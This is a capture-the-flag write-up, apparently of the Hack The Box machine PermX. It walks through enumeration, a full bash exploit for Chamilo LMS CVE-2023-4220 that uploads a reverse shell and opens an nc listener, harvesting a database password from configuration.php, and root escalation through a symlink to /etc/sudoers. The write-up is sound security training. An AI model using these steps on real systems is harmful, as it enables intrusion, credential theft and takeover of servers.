
![2024-10-01_21-29](https://github.com/user-attachments/assets/d02a04c9-5208-4be1-b2e9-5ad2dffc0520)

As usual, I start by scanning the target machine with nmap, we see only two open ports,
<pre><code>~> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.23 | tee nmap1.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-01 13:32 -03
Initiating SYN Stealth Scan at 13:32
Scanning 10.10.11.23 [65535 ports]
Discovered open port 80/tcp on 10.10.11.23
Discovered open port 22/tcp on 10.10.11.23
Completed SYN Stealth Scan at 13:32, 26.65s elapsed (65535 total ports)
Nmap scan report for 10.10.11.23
Host is up, received user-set (0.47s latency).
Scanned at 2024-10-01 13:32:14 -03 for 27s
Not shown: 58040 filtered tcp ports (no-response), 7493 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 127867 (5.626MB) | Rcvd: 7597 (303.908KB)</code></pre>


<pre><code>> sudo nmap -p80,22 -sCV -Pn 10.10.11.23 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-01 13:34 -03
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds</code></pre>

if we try to access the page, we will not be able to, so we need to modify the /etc/hosts and add the ip and domain name

<pre><code>~> sudo nano /etc/hosts</code></pre>

![2024-10-01_21-36](https://github.com/user-attachments/assets/ea84d071-449a-4c74-bfd4-0a57da5a5040)

I performed several directory and subdomain enumeration tests using tools such as Gobuster and FFUF.

<pre><code>> gobuster dir -u http://permx.htb/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 | tee gobuster.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://permx.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]</code></pre>

<pre><code>> ffuf -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://permx.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 271ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 184ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 212ms]

</code></pre>

looking for subdomains I found these two.

<pre><code>> ffuf -u http://permx.htb -H "host:FUZZ.permx.htb" -w /home/maxi/Escritorio/SecLists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 18 | tee ffuf-dns.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /home/maxi/Escritorio/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 3898ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 212ms]</code></pre>


<pre><code>sudo nano /etc/hosts
10.10.11.23 permx.htb www.permx.htb lms.permx.htb
</code></pre>

If we go to lms.permx.htb we can find this chamilo login panel.
![2024-10-01_14-21](https://github.com/user-attachments/assets/9f1bebc6-50c1-44d8-9631-639956d8f2c1)

Now let's search for exposed files in chamilo with gobuster.
<pre><code>> sudo gobuster dir -u http://lms.permx.htb -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,js,json,cfg,xml,zip -t 200
[sudo] contraseña para maxi: 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lms.permx.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,js,json,cfg,xml,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.php             (Status: 302) [Size: 0] [--> whoisonline.php]
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/LICENSE              (Status: 200) [Size: 35147]
/index.php            (Status: 200) [Size: 19356]
/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/terms.php            (Status: 200) [Size: 16127]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/.                    (Status: 200) [Size: 19348]
/license.txt          (Status: 200) [Size: 1614]
/robots.txt           (Status: 200) [Size: 748]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/plugin               (Status: 301) [Size: 315] [--> http://lms.permx.htb/plugin/]
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/news_list.php        (Status: 200) [Size: 13995]
</code></pre>


we can see that there is a robots.txt file, reading it we discover the chamilo documentation and with it the version that is being used, now we can search for exploits.
![2024-10-01_14-53](https://github.com/user-attachments/assets/d32eaa8a-4f90-488f-9f67-1d23d4fb0501)

![2024-10-01_14-55](https://github.com/user-attachments/assets/7fb6e6f1-46f8-42b5-8436-5e225217e988)

CVE-2023-4220 is a critical vulnerability found in Chamilo LMS, an open source learning management system. This vulnerability allows remote code execution (RCE) due to insecure deserialization in the upload of certain files, which can be exploited by an attacker to execute arbitrary commands on the server.

https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit
![2024-10-01_14-58](https://github.com/user-attachments/assets/c95e6536-8995-4008-9f97-3aef99a349b7)

This script is designed to exploit a vulnerability in Chamilo LMS that allows unrestricted file uploads, which can result in remote code execution (RCE). The exploit focuses on the bigUpload.php file, which does not properly validate the type of files that can be uploaded.

The script accepts input parameters that define the path to the reverse shell file, the host link and the port for the reverse connection. These parameters are essential for the operation of the exploit.

It uses curl to send a malicious file to the target server. This file, usually a reverse shell, allows the attacker to execute commands on the server once it is successfully uploaded.
<pre><code>
# Exploit Title : Chamilo LMS CVE-2023-4220 Exploit
# Date : 11/28/2023
# Exploit Author : Ziad Sakr (@Ziad-Sakr)
# Version : ≤v1.11.24
# CVE : 2023-4220
# CVE Link : https://nvd.nist.gov/vuln/detail/CVE-2023-4220
#
# Description :
#   This is an Exploit for Unrestricted file upload in big file upload functionality in Chamilo-LMS for this 
#   location "/main/inc/lib/javascript/bigupload/inc/bigUpload.php" in Chamilo LMS <= v1.11.24, and Attackers can 
#   obtain remote code execution via uploading of web shell.
#
# Usage:  ./CVE-2023-4220.sh -f reveres_file -h host_link -p port_in_the_reverse_file


#!/bin/bash

# Initialize variables with default values
reverse_file=""
host_link=""
port=""

#------------------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


# Usage function to display script usage
usage() {
    echo -e "${GREEN}"
    echo "Usage: $0 -f reverse_file -h host_link -p port_in_the_reverse_file"
    echo -e "${NC}"
    echo "Options:"
    echo "  -f    Path to the reverse file"
    echo "  -h    Host link where the file will be uploaded"
    echo "  -p    Port for the reverse shell"
    exit 1
}

# Parse command-line options
while getopts "f:h:p:" opt; do
    case $opt in
        f)
            reverse_file=$OPTARG
            ;;
        h)
            host_link=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
        \?)
            echo -e "${RED}"
            echo "Invalid option: -$OPTARG" >&2
            usage
            ;;
        :)
	    echo -e "${RED}"
            echo "Option -$OPTARG requires an argument." >&2
            usage
            ;;
    esac
done

# Check if all required options are provided
if [ -z "$reverse_file" ] || [ -z "$host_link" ] || [ -z "$port" ]; then
    echo -e  "${RED}"
    echo "All options -f, -h, and -p are required."
    usage
fi
# Perform the file upload using curl
echo -e "${GREEN}" 
curl -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
echo
echo
echo -e "#    Use This leter For Interactive TTY ;) " "${RED}"
echo "#    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "#    export TERM=xterm"
echo "#    CTRL + Z"
echo "#    stty raw -echo; fg"
echo -e "${GREEN}"
echo "# Starting Reverse Shell On Port $port . . . . . . ."
sleep 3
curl "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" &
echo -e  "${NC}"

nc -lnvp $port 
</code></pre>

I am going to use the reverse shell of pentest monkey

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

we start nc to the port we have defined in the reverse shell 
<pre><code>
~> ./CVE-2023-4220.sh -f php-reverse-shell.php -h http://lms.permx.htb/ -p 1234

The file has successfully been uploaded.

#    Use This leter For Interactive TTY ;)  
#    python3 -c 'import pty;pty.spawn("/bin/bash")'
#    export TERM=xterm
#    CTRL + Z
#    stty raw -echo; fg

# Starting Reverse Shell On Port 1234 . . . . . . .

Error: Couldn't setup listening socket (err=-3)</code></pre>

<pre><code>Connection from 10.10.11.23:58742
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 23:16:16 up 13:15,  1 user,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ </code></pre>

now that we have access to the machine we can search for our first flag.

the chamilo configuration.php file may contain sensitive information, such as database credentials or system settings.
<pre><code>$ whoami
www-data</code></pre>

<pre><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@permx:/$ export TERM=xterm
export TERM=xterm</code></pre>

<pre><code>www-data@permx:/$ ls
ls
bin   dev  home  lib32	libx32	   media  opt	root  sbin  sys  usr
boot  etc  lib	lib64	lost+found  mnt    proc  run   srv   tmp  var
www-data@permx:/$ cd home
cd home
www-data@permx:/home$ ls
ls
mtz
www-data@permx:/home$ cd mtz
cd mtz
bash: cd: mtz: Permission denied</code></pre>

<pre><code>www-data@permx:/$ ls
ls
bin   dev  home  lib32	libx32	   media  opt	root  sbin  sys  usr
boot  etc  lib	lib64	lost+found  mnt    proc  run   srv   tmp  var
www-data@permx:/$ cd /var/   
cd /var/
www-data@permx:/var$ ls
ls
backups  cache	crash  lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@permx:/var$ cd www
cd www
www-data@permx:/var/www$ ls
ls
chamilo  html
www-data@permx:/var/www$ cd chamilo
cd chamilo
www-data@permx:/var/www/chamilo$ ls
ls
CODE_OF_CONDUCT.md    certificates    favicon.png    terms.php
CONTRIBUTING.md       cli-config.php  index.php      user.php
LICENSE		     codesize.xml    license.txt    user_portal.php
README.md	     composer.json   main	    vendor
app		     composer.lock   news_list.php  web
apple-touch-icon.png  custompages     plugin	    web.config
bin		     documentation   robots.txt     whoisonline.php
bower.json	     favicon.ico     src	    whoisonlinesession.php</code></pre>


<pre><code>ww-data@permx:/var/www/chamilo$ cd app
cd app
www-data@permx:/var/www/chamilo/app$ cd config
cd config
www-data@permx:/var/www/chamilo/app/config$ ls
ls
add_course.conf.dist.php   course_info.conf.php  profile.conf.dist.php
add_course.conf.php	  events.conf.dist.php  profile.conf.php
assetic.yml		  events.conf.php	routing.yml
auth.conf.dist.php	  fos			routing_admin.yml
auth.conf.php		  ivory_ckeditor.yml	routing_dev.yml
config.yml		  mail.conf.dist.php	routing_front.yml
config_dev.yml		  mail.conf.php	security.yml
config_prod.yml		  migrations.yml	services.yml
configuration.php	  mopa			sonata
course_info.conf.dist.php  parameters.yml.dist
www-data@permx:/var/www/chamilo/app/config$ cat configuration.php
</code></pre>


<pre><code>
?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
</code></pre>

testing those credentials with the user mtz I was able to log in successfully
<pre><code>www-data@permx:/var/www/chamilo/app/config$ su mtz
su mtz
Password: 03F6lY3uXAP2bkW8

mtz@permx:/var/www/chamilo/app/config$ whoami
whoami
mtz
mtz@permx:/var/www/chamilo/app/config$ 
</code></pre>

<pre><code>mtz@permx:/var/www/chamilo/app/config$ cd ~
cd ~
mtz@permx:~$ ls
ls
f23  lele.txt  try.txt  user.txt
mtz@permx:~$ cat user.txt
cat user.txt
???</code></pre>


now i have to escalate privileges to get the rooot flag
I ran sudo -l and found that this user has permissions to run the /opt/acl.sh script without entering a password. This is a key opportunity for privilege escalation.
<pre><code>mtz@permx:~$ sudo -l
sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh</code></pre>

is a bash script that appears to be designed to modify file permissions on a Linux system using ACL (Access Control Lists).

The script expects to receive three arguments: a user, a permission and a file. If exactly three arguments are not provided, it displays a usage message and terminates.

It makes sure that the target (target file) is inside the /home/mtz/ directory and that it does not contain directory sequences such as .... This is a security measure to prevent manipulation of files outside this directory.

Checks if the target is a valid file. If it is not, it displays an error message and terminates.

Use setfacl with sudo to add a new permission for the specified user on the target file. This allows the specified user to get additional permissions on the file.
<pre><code>mtz@permx:/$
mtz@permx:/opt$ cat acl.sh
cat acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"</code></pre>

By executing these commands, you are creating a symbolic link to the sudoers file in your home directory and then using the /opt/acl.sh script to add permissions to that link

This creates a symbolic link called sudoers in your home directory that points to the file /etc/sudoers
<pre><code>mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers</code></pre>

I use the script to grant read and write permissions to the user mtz on the sudoers file (via the symbolic link).
If the script works correctly, mtz will be able to modify the sudoers file, allowing privilege escalation.
<pre><code>mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudoers</code></pre>

now with nano we can modify the sudoers file and change “mtz ALL= (ALL : ALL) NOPASSWD: /opt/acl.sh” to “mtz ALL=(ALL:ALL) NOPASSWD: ALL”.

by doing this we allow mtz to execute any command 

if we did everything right we should be able to see “-> /etc/sudoers” next to the sudoers file that we created
<pre><code>mtz@permx:~$ ls -la
total 52
drwxr-x---  5 mtz  mtz   4096 Oct  2 00:27 .
drwxr-xr-x  3 root root  4096 Jan 20  2024 ..
lrwxrwxrwx  1 root root     9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r--  1 mtz  mtz    220 Jan  6  2022 .bash_logout
-rw-r--r--  1 mtz  mtz   3771 Jan  6  2022 .bashrc
drwx------  2 mtz  mtz   4096 May 31 11:14 .cache
-rw-rw-r--  1 mtz  mtz   1742 Oct  1 21:47 f23
-rw-rw-r--  1 mtz  mtz      0 Oct  1 21:24 lele.txt
drwxrwxr-x  3 mtz  mtz   4096 Oct  1 15:50 .local
lrwxrwxrwx  1 root root     9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r--  1 mtz  mtz    807 Jan  6  2022 .profile
-rw-rw-r--  1 mtz  mtz      0 Oct  1 23:49 script.sh
-rw-r--r--  1 mtz  mtz  12288 Oct  1 23:50 .script.sh.swp
drwx------  2 mtz  mtz   4096 Jan 20  2024 .ssh
lrwxrwxrwx  1 mtz  mtz     12 Oct  2 00:27 sudoers -> /etc/sudoers
-rw-rw-r--  1 mtz  mtz      0 Oct  1 23:55 sudores
-rw-rwxr--+ 1 mtz  mtz      0 Oct  1 21:18 try.txt
-rw-r-----  1 root mtz     33 Oct  1 10:08 user.txt</code></pre>

<pre><code>root@permx:/home/mtz# cd ..
root@permx:/home# cd ..
root@permx:/# cd ..
root@permx:/# ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
root@permx:/# cd root
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
???</code></pre>
